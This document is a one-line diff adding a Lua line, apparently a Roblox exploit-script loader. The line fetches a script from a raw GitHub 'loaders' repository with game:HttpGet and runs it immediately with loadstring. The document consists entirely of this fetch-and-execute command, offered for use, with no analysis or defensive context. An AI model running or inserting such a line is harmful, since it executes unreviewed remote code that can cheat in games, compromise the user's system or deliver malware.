@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/now-paint-to-get-rich-spam6-pvr19kryjlwegf.lua"))()
